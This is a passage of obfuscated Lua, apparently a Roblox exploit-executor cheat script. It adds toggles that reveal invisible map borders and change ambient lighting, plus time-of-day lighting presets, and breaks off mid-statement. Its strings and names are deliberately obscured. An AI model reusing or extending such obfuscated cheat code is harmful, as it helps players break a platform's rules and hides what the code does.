 local _IIIIIlIllI = {} _llIlIIlIIl:AddToggle("\083\101\101\073\110\118\105\115\105\098\108\101\066\111\114\100\101\114\115", { Text = "\083\101\101\032\073\110\118\105\115\105\098\108\101\032\066\111\114\100\101\114\115", Default = false, Callback = function (_IIlIlIIlII) for _lIIlIllIlI, _IllIIlIllI in pairs(_IIIIIlIllI) do pcall( function () _IllIIlIllI:Disconnect() end
 ) end
 table.clear(_IIIIIlIllI) local _IIIlllIlII = workspace:FindFirstChild("\077\097\112") local _llIIIIllll = _IIIlllIlII and _IIIlllIlII:FindFirstChild("\073\110\118\105\115\105\098\108\101\066\111\114\100\101\114") if not _llIIIIllll then return end
 for _lIIlIllIlI, obj in pairs(_llIIIIllll:GetDescendants()) do if obj:IsA("\066\097\115\101\080\097\114\116") then obj.Transparency = _IIlIlIIlII and 0.2 or 0x1 if _IIlIlIIlII then _IIIIIlIllI[#_IIIIIlIllI + 0x1] = obj:GetPropertyChangedSignal("\084\114\097\110\115\112\097\114\101\110\099\121"):Connect( function () if _llIIllIlll.SeeInvisibleBorders.Value and obj.Transparency ~= 0.2 then obj.Transparency = 0.2 end
 end
 ) end
 end
 end
 if _IIlIlIIlII then _IIIIIlIllI[#_IIIIIlIllI + 0x1] = _llIIIIllll.DescendantAdded:Connect( function (obj) if not obj:IsA("\066\097\115\101\080\097\114\116") then return end
 obj.Transparency = 0.2 _IIIIIlIllI[#_IIIIIlIllI + 0x1] = obj:GetPropertyChangedSignal("\084\114\097\110\115\112\097\114\101\110\099\121"):Connect( function () if _llIIllIlll.SeeInvisibleBorders.Value and obj.Transparency ~= 0.2 then obj.Transparency = 0.2 end
 end
 ) end
 ) end
 end
 , }) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IllIIlIllI in pairs(_IIIIIlIllI) do pcall( function () _IllIIlIllI:Disconnect() end
 ) end
 table.clear(_IIIIIlIllI) pcall( function () _llIIllIlll.SeeInvisibleBorders:SetValue(false) end
 ) end
 ) _llIlIIlIIl:AddDivider() _llIlIIlIIl:AddToggle("\065\109\098\105\101\110\116\069\110\097\098\108\101\100", { Text = "\065\109\098\105\101\110\116\032\069\110\097\098\108\101\100", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _llIIlIIlll = _IIIIIIllIl.Ambient _IIIIIIllIl.Ambient = _lIIlIllIlI.AmbientColor.Value repeat task.wait() until not _llIIllIlll.AmbientEnabled.Value _IIIIIIllIl.Ambient = _llIIlIIlll end
 end
 , }):AddColorPicker("\065\109\098\105\101\110\116\067\111\108\111\114", { Default = Color3.fromRGB(0xFF, 0xFF, 0xFF), Title = "\065\109\098\105\101\110\116", Callback = function (color) if _llIIllIlll.AmbientEnabled.Value then _IIIIIIllIl.Ambient = color end
 end
 , }) _llIlIIlIIl:AddToggle("\082\097\105\110\098\111\119\065\109\098\105\101\110\116", { Text = "\082\097\105\110\098\111\119\032\065\109\098\105\101\110\116", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then repeat local _lIIIllllII = tick() * 0x2 local _IIIlIIIIIl = math.abs(math.sin(_lIIIllllII)) * 0xFF local _IIlIIlIIII = math.abs(math.sin(_lIIIllllII + math.pi / 0x3)) * 0xFF local _llIIIIlllI = math.abs(math.sin(_lIIIllllII + 0x2 * math.pi / 0x3)) * 0xFF _lIIlIllIlI.AmbientColor:SetValueRGB(Color3.fromRGB(_IIIlIIIIIl, _IIlIIlIIII, _llIIIIlllI)) _lIIlIllIlI.AmbientColor:Update() task.wait(0.03) until not _llIIllIlll.RainbowAmbient.Value _lIIlIllIlI.AmbientColor:SetValueRGB(Color3.fromRGB(0xFF, 0xFF, 0xFF)) _lIIlIllIlI.AmbientColor:Update() end
 end
 , }) _llIlIIlIIl:AddDivider() _llIlIIlIIl:AddDropdown("\076\105\103\104\116\105\110\103\080\114\101\115\101\116", { Text = "\076\105\103\104\116\105\110\103\032\080\114\101\115\101\116", Values = {"\078\111\110\101", "\087\097\114\109", "\078\105\103\104\116", "\083\117\110\114\105\115\105\110\103", "\065\117\116\111\045\083\107\121"}, Default = "\078\111\110\101", Callback = function (_IIlIlIIlII) local function _IIIllIlIII() if getgenv()._lightingPresetOrig then return end
 getgenv()._lightingPresetOrig = { ClockTime = _IIIIIIllIl.ClockTime, Brightness = _IIIIIIllIl.Brightness, ExposureCompensation = _IIIIIIllIl.ExposureCompensation, Ambient = _IIIIIIllIl.Ambient, OutdoorAmbient = _IIIIIIllIl.OutdoorAmbient, FogColor = _IIIIIIllIl.FogColor, FogStart = _IIIIIIllIl.FogStart, FogEnd = _IIIIIIllIl.FogEnd, GeographicLatitude = _IIIIIIllIl.GeographicLatitude, ShadowSoftness = _IIIIIIllIl.ShadowSoftness, GlobalShadows = _IIIIIIllIl.GlobalShadows, EnvironmentDiffuseScale = _IIIIIIllIl.EnvironmentDiffuseScale, EnvironmentSpecularScale = _IIIIIIllIl.EnvironmentSpecularScale, Technology = _IIIIIIllIl.Technology, } local _lllllIIIII = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") if _lllllIIIII then getgenv()._lightingPresetOrig.Atmo = { Density = _lllllIIIII.Density, Offset = _lllllIIIII.Offset, Color = _lllllIIIII.Color, Decay = _lllllIIIII.Decay, Glare = _lllllIIIII.Glare, Haze = _lllllIIIII.Haze, } end
 local _IlIIlIIIlI = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") if _IlIIlIIIlI then getgenv()._lightingPresetOrig.SunRays = { Intensity = _IlIIlIIIlI.Intensity, Spread = _IlIIlIIIlI.Spread, } end
 local _IlllIIllIl = _IIIIIIllIl:FindFirstChildOfClass("\066\108\111\111\109\069\102\102\101\099\116") if _IlllIIllIl then getgenv()._lightingPresetOrig.Bloom = { Intensity = _IlllIIllIl.Intensity, Size = _IlllIIllIl.Size, Threshold = _IlllIIllIl.Threshold, Enabled = _IlllIIllIl.Enabled, } else getgenv()._lightingPresetOrig.Bloom = false end
 local _IllIIlIllI = _IIIIIIllIl:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if _IllIIlIllI then getgenv()._lightingPresetOrig.ColorCorrection = { Brightness = _IllIIlIllI.Brightness, Contrast = _IllIIlIllI.Contrast, Saturation = _IllIIlIllI.Saturation, TintColor = _IllIIlIllI.TintColor, Enabled = _IllIIlIllI.Enabled, } else getgenv()._lightingPresetOrig.ColorCorrection = false end
 local _lIIlllIlIl = _IIIIIIllIl:FindFirstChildOfClass("\083\107\121") if _lIIlllIlIl then getgenv()._lightingPresetOrig.MoonAngularSize = _lIIlllIlIl.MoonAngularSize getgenv()._lightingPresetOrig.SunAngularSize = _lIIlllIlIl.SunAngularSize end
 end
 local function _lIlIlIlIII() local _IlIIIlllII = getgenv()._lightingPresetOrig if not _IlIIIlllII then return end
 _IIIIIIllIl.ClockTime = _IlIIIlllII.ClockTime _IIIIIIllIl.Brightness = _IlIIIlllII.Brightness _IIIIIIllIl.ExposureCompensation = _IlIIIlllII.ExposureCompensation _IIIIIIllIl.Ambient = _IlIIIlllII.Ambient _IIIIIIllIl.OutdoorAmbient = _IlIIIlllII.OutdoorAmbient _IIIIIIllIl.FogColor = _IlIIIlllII.FogColor _IIIIIIllIl.FogStart = _IlIIIlllII.FogStart _IIIIIIllIl.FogEnd = _IlIIIlllII.FogEnd _IIIIIIllIl.GeographicLatitude = _IlIIIlllII.GeographicLatitude _IIIIIIllIl.ShadowSoftness = _IlIIIlllII.ShadowSoftness _IIIIIIllIl.GlobalShadows = _IlIIIlllII.GlobalShadows _IIIIIIllIl.EnvironmentDiffuseScale = _IlIIIlllII.EnvironmentDiffuseScale _IIIIIIllIl.EnvironmentSpecularScale = _IlIIIlllII.EnvironmentSpecularScale _IIIIIIllIl.Technology = _IlIIIlllII.Technology local _IllIIIllll = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") if _IllIIIllll and _IlIIIlllII.Atmo then _IllIIIllll.Density = _IlIIIlllII.Atmo.Density _IllIIIllll.Offset = _IlIIIlllII.Atmo.Offset _IllIIIllll.Color = _IlIIIlllII.Atmo.Color _IllIIIllll.Decay = _IlIIIlllII.Atmo.Decay _IllIIIllll.Glare = _IlIIIlllII.Atmo.Glare _IllIIIllll.Haze = _IlIIIlllII.Atmo.Haze end
 local _lIlIIIIlII = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") if _lIlIIIIlII and _IlIIIlllII.SunRays then _lIlIIIIlII.Intensity = _IlIIIlllII.SunRays.Intensity _lIlIIIIlII.Spread = _IlIIIlllII.SunRays.Spread end
 local _IlllIIllIl = _IIIIIIllIl:FindFirstChildOfClass("\066\108\111\111\109\069\102\102\101\099\116") if _IlIIIlllII.Bloom == false then if _IlllIIllIl then pcall( function () _IlllIIllIl:Destroy() end
 ) end
 elseif _IlIIIlllII.Bloom and _IlllIIllIl then _IlllIIllIl.Intensity = _IlIIIlllII.Bloom.Intensity _IlllIIllIl.Size = _IlIIIlllII.Bloom.Size _IlllIIllIl.Threshold = _IlIIIlllII.Bloom.Threshold _IlllIIllIl.Enabled = _IlIIIlllII.Bloom.Enabled end
 local _IllIIlIllI = _IIIIIIllIl:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if _IlIIIlllII.ColorCorrection == false then if _IllIIlIllI then pcall( function () _IllIIlIllI:Destroy() end
 ) end
 elseif _IlIIIlllII.ColorCorrection and _IllIIlIllI then _IllIIlIllI.Brightness = _IlIIIlllII.ColorCorrection.Brightness _IllIIlIllI.Contrast = _IlIIIlllII.ColorCorrection.Contrast _IllIIlIllI.Saturation = _IlIIIlllII.ColorCorrection.Saturation _IllIIlIllI.TintColor = _IlIIIlllII.ColorCorrection.TintColor _IllIIlIllI.Enabled = _IlIIIlllII.ColorCorrection.Enabled end
 if _IlIIIlllII.SkyRef and _IlIIIlllII.SkyRef.Parent then _IlIIIlllII.SkyRef.Parent = _IIIIIIllIl end
 local _lIIlllIlIl = _IIIIIIllIl:FindFirstChildOfClass("\083\107\121") if _lIIlllIlIl and _IlIIIlllII.MoonAngularSize then _lIIlllIlIl.MoonAngularSize = _IlIIIlllII.MoonAngularSize end
 if _lIIlllIlIl and _IlIIIlllII.SunAngularSize then _lIIlllIlIl.SunAngularSize = _IlIIIlllII.SunAngularSize end
 getgenv()._lightingPresetOrig = nil end
 local function _lIIIllIllI() local _IlIIIlllII = getgenv()._lightingPresetOrig if _IlIIIlllII and _IlIIIlllII.SkyRef then local _lIlIlllIII = _IlIIIlllII.SkyRef if _lIlIlllIII and _lIlIlllIII.Parent ~= _IIIIIIllIl then _lIlIlllIII.Parent = _IIIIIIllIl end
 _IlIIIlllII.SkyRef = nil end
 end
 local _lIllllllII = { ["\085\110\105\102\105\101\100"] = Enum.Technology.Unified, ["\070\117\116\117\114\101"] = Enum.Technology.Future, ["\083\104\097\100\111\119\077\097\112"] = Enum.Technology.ShadowMap, ["\086\111\120\101\108"] = Enum.Technology.Voxel, ["\067\111\109\112\097\116\105\098\105\108\105\116\121"] = Enum.Technology.Compatibility, } local function _lIlIlllIIl() return _lIllllllII[_lIIlIllIlI.LightingTechnology and _lIIlIllIlI.LightingTechnology.Value] or Enum.Technology.Unified end
 local _lllIIlIIlI = { { clock=0x0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x50,0xA2), OA=Color3.fromRGB(0x3A,0x44,0x94), Fog=Color3.fromRGB(0x30,0x36,0x7A), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0x12,0xC,0x48), Adc=Color3.fromRGB(0x8,0x5,0x30), AG=0.00, AH=0.05, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, { clock=2.5, Br=3.55, EC=1.02, Amb=Color3.fromRGB(0x42,0x48,0x98), OA=Color3.fromRGB(0x34,0x3C,0x8A), Fog=Color3.fromRGB(0x2A,0x30,0x76), FE=0xED8, ED=0.62, ES=0.52, SR=0.13, AD=0.24, AO=0.00, AC=Color3.fromRGB(0xE,0xA,0x40), Adc=Color3.fromRGB(0x6,0x4,0x2A), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.28, BlS=0x16, BlT=0.82, CCB=0.01, CCC=0.10, CCS=0.05, CCT=Color3.fromRGB(0xB6,0xAE,0xF2) }, { clock=4.5, Br=2.20, EC=0.65, Amb=Color3.fromRGB(0x37,0x28,0x78), OA=Color3.fromRGB(0x2D,0x1E,0x6C), Fog=Color3.fromRGB(0x30,0x22,0x70), FE=0xED8, ED=0.60, ES=0.50, SR=0.16, AD=0.20, AO=0.00, AC=Color3.fromRGB(0x16,0xA,0x50), Adc=Color3.fromRGB(0xC,0x5,0x37), AG=0.02, AH=0.08, SI=0.20, SS=0.022, BlI=0.24, BlS=0x18, BlT=0.78, CCB=0.00, CCC=0.10, CCS=0.10, CCT=Color3.fromRGB(0xB2,0xA5,0xE4) }, { clock=5.5, Br=0.80, EC=0.22, Amb=Color3.fromRGB(0x76,0x50,0x94), OA=Color3.fromRGB(0x87,0x58,0xA2), Fog=Color3.fromRGB(0x94,0x5E,0x9E), FE=0x1130, ED=0.73, ES=0.62, SR=0.20, AD=0.17, AO=0.01, AC=Color3.fromRGB(0x52,0x2A,0x73), Adc=Color3.fromRGB(0x37,0x16,0x52), AG=0.08, AH=0.12, SI=0.35, SS=0.035, BlI=0.36, BlS=0x1E, BlT=0.68, CCB=0.02, CCC=0.14, CCS=0.20, CCT=Color3.fromRGB(0xE1,0xB9,0xD7) }, { clock=6.33, Br=0.00, EC=0.00, Amb=Color3.fromRGB(0x0,0x0,0x0), OA=Color3.fromRGB(0x19,0x19,0x19), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x1388, ED=1.00, ES=1.00, SR=0.20, AD=0.213, AO=0.00, AC=Color3.fromRGB(0x2,0x2,0x2), Adc=Color3.fromRGB(0x0,0x0,0x0), AG=0.00, AH=0.00, SI=0.72, SS=0.049, BlI=0.18, BlS=0x12, BlT=0.68, CCB=0.00, CCC=0.12, CCS=0.18, CCT=Color3.fromRGB(0xF5,0xD7,0xB2) }, { clock=7.5, Br=0.00, EC=0.40, Amb=Color3.fromRGB(0xA3,0xAC,0x8F), OA=Color3.fromRGB(0xCA,0xB4,0x71), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x1388, ED=0.756, ES=0.585, SR=0.18, AD=0.213, AO=0.00, AC=Color3.fromRGB(0x2,0x2,0x2), Adc=Color3.fromRGB(0x0,0x0,0x0), AG=0.00, AH=0.00, SI=0.95, SS=0.14, BlI=0.22, BlS=0x14, BlT=0.70, CCB=0.01, CCC=0.10, CCS=0.16, CCT=Color3.fromRGB(0xF5,0xE6,0xCD) }, { clock=9.0, Br=0.00, EC=0.12, Amb=Color3.fromRGB(0x8A,0x98,0xA8), OA=Color3.fromRGB(0x94,0xA0,0xAF), Fog=Color3.fromRGB(0xB9,0xBE,0xC8), FE=0x1CE8, ED=0.88, ES=0.85, SR=0.10, AD=0.09, AO=0.05, AC=Color3.fromRGB(0x14,0x2A,0x44), Adc=Color3.fromRGB(0xA,0x18,0x30), AG=0.02, AH=0.08, SI=0.25, SS=0.022, BlI=0.14, BlS=0x12, BlT=0.88, CCB=0.00, CCC=0.07, CCS=0.08, CCT=Color3.fromRGB(0xEB,0xF0,0xFC) }, { clock=12.0, Br=0.00, EC=0.00, Amb=Color3.fromRGB(0x94,0xA0,0xAF), OA=Color3.fromRGB(0x9E,0xA8,0xB6), Fog=Color3.fromRGB(0xC0,0xC0,0xC0), FE=0x251C, ED=0.92, ES=0.90, SR=0.08, AD=0.05, AO=0.08, AC=Color3.fromRGB(0xF,0x2A,0x52), Adc=Color3.fromRGB(0x8,0x19,0x3C), AG=0.01, AH=0.05, SI=0.15, SS=0.018, BlI=0.08, BlS=0x10, BlT=0.92, CCB=-0.02, CCC=0.06, CCS=0.06, CCT=Color3.fromRGB(0xE8,0xEE,0xFC) }, { clock=15.0, Br=0.00, EC=0.10, Amb=Color3.fromRGB(0xA0,0x9C,0x8E), OA=Color3.fromRGB(0xAC,0x9E,0x87), Fog=Color3.fromRGB(0xBC,0xB6,0xAA), FE=0x1DB0, ED=0.88, ES=0.85, SR=0.12, AD=0.09, AO=0.04, AC=Color3.fromRGB(0x1C,0x28,0x3A), Adc=Color3.fromRGB(0xF,0x16,0x26), AG=0.03, AH=0.12, SI=0.30, SS=0.025, BlI=0.15, BlS=0x12, BlT=0.82, CCB=0.00, CCC=0.07, CCS=0.08, CCT=Color3.fromRGB(0xF5,0xEE,0xDA) }, { clock=16.5, Br=0.00, EC=0.28, Amb=Color3.fromRGB(0xC3,0xB2,0x94), OA=Color3.fromRGB(0xD2,0xB6,0x8A), Fog=Color3.fromRGB(0xC8,0xB6,0x9E), FE=0x1838, ED=0.94, ES=0.90, SR=0.18, AD=0.09, AO=0.03, AC=Color3.fromRGB(0x44,0x34,0x16), Adc=Color3.fromRGB(0x2A,0x1C,0x8), AG=0.10, AH=0.20, SI=0.55, SS=0.032, BlI=0.35, BlS=0x10, BlT=0.65, CCB=0.02, CCC=0.11, CCS=0.16, CCT=Color3.fromRGB(0xF8,0xEB,0xD2) }, { clock=17.5, Br=0.00, EC=0.28, Amb=Color3.fromRGB(0xD2,0xAF,0x80), OA=Color3.fromRGB(0xDE,0xB4,0x76), Fog=Color3.fromRGB(0xD7,0xAC,0x8A), FE=0x15E0, ED=0.92, ES=0.87, SR=0.20, AD=0.10, AO=0.03, AC=Color3.fromRGB(0x58,0x3A,0x16), Adc=Color3.fromRGB(0x3A,0x20,0x8), AG=0.18, AH=0.25, SI=0.80, SS=0.060, BlI=0.55, BlS=0x12, BlT=0.55, CCB=0.02, CCC=0.13, CCS=0.18, CCT=Color3.fromRGB(0xFC,0xE6,0xC8) }, { clock=18.5, Br=0.30, EC=0.38, Amb=Color3.fromRGB(0xAF,0x80,0x6C), OA=Color3.fromRGB(0xC0,0x84,0x70), Fog=Color3.fromRGB(0xB6,0x7A,0x76), FE=0x1388, ED=0.88, ES=0.83, SR=0.20, AD=0.12, AO=0.02, AC=Color3.fromRGB(0x69,0x30,0x1C), Adc=Color3.fromRGB(0x4B,0x16,0xC), AG=0.12, AH=0.28, SI=0.65, SS=0.034, BlI=0.50, BlS=0x12, BlT=0.58, CCB=0.02, CCC=0.12, CCS=0.14, CCT=Color3.fromRGB(0xF2,0xD0,0xC3) }, { clock=19.5, Br=1.60, EC=0.72, Amb=Color3.fromRGB(0x58,0x44,0x9E), OA=Color3.fromRGB(0x4B,0x3A,0x91), Fog=Color3.fromRGB(0x50,0x3E,0x94), FE=0x1068, ED=0.72, ES=0.62, SR=0.18, AD=0.18, AO=0.01, AC=Color3.fromRGB(0x2D,0x14,0x69), Adc=Color3.fromRGB(0x1C,0xA,0x4B), AG=0.04, AH=0.12, SI=0.18, SS=0.022, BlI=0.34, BlS=0x1C, BlT=0.68, CCB=0.02, CCC=0.12, CCS=0.12, CCT=Color3.fromRGB(0xC3,0xB4,0xF0) }, { clock=21.0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x55,0xA4), OA=Color3.fromRGB(0x3A,0x48,0x96), Fog=Color3.fromRGB(0x2D,0x37,0x64), FE=0xFA0, ED=0.65, ES=0.55, SR=0.15, AD=0.21, AO=0.00, AC=Color3.fromRGB(0xC,0x14,0x48), Adc=Color3.fromRGB(0x5,0xA,0x28), AG=0.00, AH=0.06, SI=0.00, SS=0.020, BlI=0.32, BlS=0x18, BlT=0.76, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xBC,0xB4,0xF5) }, { clock=22.5, Br=3.65, EC=1.08, Amb=Color3.fromRGB(0x48,0x55,0xA4), OA=Color3.fromRGB(0x3A,0x48,0x96), Fog=Color3.fromRGB(0x2D,0x37,0x64), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0xC,0x14,0x48), Adc=Color3.fromRGB(0x5,0xA,0x28), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, { clock=24.0, Br=3.60, EC=1.05, Amb=Color3.fromRGB(0x48,0x50,0xA2), OA=Color3.fromRGB(0x3A,0x44,0x94), Fog=Color3.fromRGB(0x30,0x36,0x7A), FE=0xFA0, ED=0.65, ES=0.55, SR=0.14, AD=0.22, AO=0.00, AC=Color3.fromRGB(0x12,0xC,0x48), Adc=Color3.fromRGB(0x8,0x5,0x30), AG=0.00, AH=0.04, SI=0.00, SS=0.020, BlI=0.30, BlS=0x18, BlT=0.80, CCB=0.02, CCC=0.10, CCS=0.08, CCT=Color3.fromRGB(0xB9,0xB2,0xF5) }, } local function _llIlIlllIl(preset) if preset == "\087\097\114\109" then _lIIIllIllI() _IIIIIIllIl.ClockTime = 6.581944465637207 _IIIIIIllIl.Brightness = 0x0 _IIIIIIllIl.ExposureCompensation = 0.4 _IIIIIIllIl.Ambient = Color3.fromRGB(0xA3, 0xAC, 0x8F) _IIIIIIllIl.OutdoorAmbient = Color3.fromRGB(0xCA, 0xB4, 0x71) _IIIIIIllIl.FogColor = Color3.fromRGB(0xC0, 0xC0, 0xC0) _IIIIIIllIl.FogStart = 0x0 _IIIIIIllIl.FogEnd = 0x1388 _IIIIIIllIl.GeographicLatitude = 314.8041076660156 _IIIIIIllIl.ShadowSoftness = 0.2 _IIIIIIllIl.GlobalShadows = true _IIIIIIllIl.EnvironmentDiffuseScale = 0.756 _IIIIIIllIl.EnvironmentSpecularScale = 0.585 _IIIIIIllIl.Technology = _lIlIlllIIl() local _IllIIIllll = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIIIIllIl) _IllIIIllll.Density = 0.213 _IllIIIllll.Offset = 0x0 _IllIIIllll.Color = Color3.fromRGB(0x2, 0x2, 0x2) _IllIIIllll.Decay = Color3.fromRGB(0x0, 0x0, 0x0) _IllIIIllll.Glare = 0x0 _IllIIIllll.Haze = 0x0 local _lIlIIIIlII = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIIIIllIl) _lIlIIIIlII.Intensity = 0.95 _lIlIIIIlII.Spread = 0.14 elseif preset == "\078\105\103\104\116" then local _IlIIIlllII = getgenv()._lightingPresetOrig if _IlIIIlllII and not _IlIIIlllII.SkyRef then local _lIIIlllIIl = _IIIIIIllIl:FindFirstChildOfClass("\083\107\121") if _lIIIlllIIl then _IlIIIlllII.SkyRef = _lIIIlllIIl _lIIIlllIIl.Parent = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") end
 end
 _IIIIIIllIl.ClockTime = 0x0 _IIIIIIllIl.Brightness = 3.5 _IIIIIIllIl.ExposureCompensation = 1.1 _IIIIIIllIl.Ambient = Color3.fromRGB(0x34, 0x41, 0x8A) _IIIIIIllIl.OutdoorAmbient = Color3.fromRGB(0x2A, 0x37, 0x7D) _IIIIIIllIl.FogColor = Color3.fromRGB(0x23, 0x2D, 0x55) _IIIIIIllIl.FogStart = 0x0 _IIIIIIllIl.FogEnd = 0xFA0 _IIIIIIllIl.GeographicLatitude = 314.8041076660156 _IIIIIIllIl.ShadowSoftness = 0.2 _IIIIIIllIl.GlobalShadows = true _IIIIIIllIl.EnvironmentDiffuseScale = 0.65 _IIIIIIllIl.EnvironmentSpecularScale = 0.55 _IIIIIIllIl.Technology = _lIlIlllIIl() local _IllIIIllll = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIIIIllIl) _IllIIIllll.Density = 0.25 _IllIIIllll.Offset = 0x0 _IllIIIllll.Color = Color3.fromRGB(0xC, 0x14, 0x48) _IllIIIllll.Decay = Color3.fromRGB(0x5, 0xA, 0x28) _IllIIIllll.Glare = 0x0 _IllIIIllll.Haze = 0x0 local _lIlIIIIlII = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIIIIllIl) _lIlIIIIlII.Intensity = 0.88 _lIlIIIIlII.Spread = 0.049 elseif preset == "\083\117\110\114\105\115\105\110\103" then _lIIIllIllI() _IIIIIIllIl.ClockTime = 6.400000095367432 _IIIIIIllIl.Brightness = 0x0 _IIIIIIllIl.ExposureCompensation = 0x0 _IIIIIIllIl.Ambient = Color3.fromRGB(0x0, 0x0, 0x0) _IIIIIIllIl.OutdoorAmbient = Color3.fromRGB(0x19, 0x19, 0x19) _IIIIIIllIl.FogColor = Color3.fromRGB(0xC0, 0xC0, 0xC0) _IIIIIIllIl.FogStart = 0x0 _IIIIIIllIl.FogEnd = 0x1388 _IIIIIIllIl.GeographicLatitude = 314.8041076660156 _IIIIIIllIl.ShadowSoftness = 0.2 _IIIIIIllIl.GlobalShadows = true _IIIIIIllIl.EnvironmentDiffuseScale = 0x1 _IIIIIIllIl.EnvironmentSpecularScale = 0x1 _IIIIIIllIl.Technology = _lIlIlllIIl() local _IllIIIllll = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIIIIllIl) _IllIIIllll.Density = 0.213 _IllIIIllll.Offset = 0x0 _IllIIIllll.Color = Color3.fromRGB(0x2, 0x2, 0x2) _IllIIIllll.Decay = Color3.fromRGB(0x0, 0x0, 0x0) _IllIIIllll.Glare = 0x0 _IllIIIllll.Haze = 0x0 local _lIlIIIIlII = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIIIIllIl) _lIlIIIIlII.Intensity = 0.72 _lIlIIIIlII.Spread = 0.049 elseif preset == "\065\117\116\111\045\083\107\121" then _lIIIllIllI() local _lIllIlIIll = os.date("\042\116") local _IIlIlIIlII = _lIllIlIIll.hour + _lIllIlIIll.min / 0x3C + _lIllIlIIll.sec / 0xE10 local _IIIIIIIIlI, B, frac for _IIllIllIll = 0x1, #_lllIIlIIlI - 0x1 do if _IIlIlIIlII >= _lllIIlIIlI[_IIllIllIll].clock and _IIlIlIIlII < _lllIIlIIlI[_IIllIllIll + 0x1].clock then _IIIIIIIIlI, B = _lllIIlIIlI[_IIllIllIll], _lllIIlIIlI[_IIllIllIll + 0x1] frac = (_IIlIlIIlII - _IIIIIIIIlI.clock) / (B.clock - _IIIIIIIIlI.clock) break end
 end
 if not _IIIIIIIIlI then _IIIIIIIIlI, B, frac = _lllIIlIIlI[#_lllIIlIIlI - 0x1], _lllIIlIIlI[#_lllIIlIIlI], 0x1 end
 local function _llIIIIlIlI(_lllllIIlII, _llIIIIlllI, _lIIIllllII) return _lllllIIlII + (_llIIIIlllI - _lllllIIlII) * _lIIIllllII end
 _IIIIIIllIl.ClockTime = _IIlIlIIlII _IIIIIIllIl.Brightness = _llIIIIlIlI(_IIIIIIIIlI.Br, B.Br, frac) _IIIIIIllIl.ExposureCompensation = _llIIIIlIlI(_IIIIIIIIlI.EC, B.EC, frac) _IIIIIIllIl.Ambient = _IIIIIIIIlI.Amb:Lerp(B.Amb, frac) _IIIIIIllIl.OutdoorAmbient = _IIIIIIIIlI.OA:Lerp(B.OA, frac) _IIIIIIllIl.FogColor = _IIIIIIIIlI.Fog:Lerp(B.Fog, frac) _IIIIIIllIl.FogStart = 0x0 _IIIIIIllIl.FogEnd = _llIIIIlIlI(_IIIIIIIIlI.FE, B.FE, frac) _IIIIIIllIl.GeographicLatitude = 314.8041076660156 _IIIIIIllIl.ShadowSoftness = _llIIIIlIlI(_IIIIIIIIlI.SR, B.SR, frac) _IIIIIIllIl.GlobalShadows = true _IIIIIIllIl.EnvironmentDiffuseScale = _llIIIIlIlI(_IIIIIIIIlI.ED, B.ED, frac) _IIIIIIllIl.EnvironmentSpecularScale = _llIIIIlIlI(_IIIIIIIIlI.ES, B.ES, frac) _IIIIIIllIl.Technology = _lIlIlllIIl() local _IllIIIllll = _IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIIIIllIl) _IllIIIllll.Density = _llIIIIlIlI(_IIIIIIIIlI.AD, B.AD, frac) _IllIIIllll.Offset = _llIIIIlIlI(_IIIIIIIIlI.AO, B.AO, frac) _IllIIIllll.Color = _IIIIIIIIlI.AC:Lerp(B.AC, frac) _IllIIIllll.Decay = _IIIIIIIIlI.Adc:Lerp(B.Adc, frac) _IllIIIllll.Glare = _llIIIIlIlI(_IIIIIIIIlI.AG, B.AG, frac) _IllIIIllll.Haze = _llIIIIlIlI(_IIIIIIIIlI.AH, B.AH, frac) local _lIlIIIIlII = _IIIIIIllIl:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIIIIllIl) _lIlIIIIlII.Intensity = _llIIIIlIlI(_IIIIIIIIlI.SI, B.SI, frac) _lIlIIIIlII.Spread = 